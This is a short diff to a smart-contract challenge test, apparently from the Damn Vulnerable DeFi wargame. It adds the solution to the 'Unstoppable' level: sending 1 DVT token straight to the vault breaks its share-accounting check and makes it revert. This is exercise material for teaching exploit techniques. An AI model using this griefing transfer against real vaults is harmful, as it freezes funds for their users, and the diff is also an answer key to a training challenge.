@@ -91,7 +91,8 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        
+        // Directly transfers only 1 DVT to the vault in order to break 'if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();' condition
+        token.transfer(address(vault), 1);
     }
 
     /**
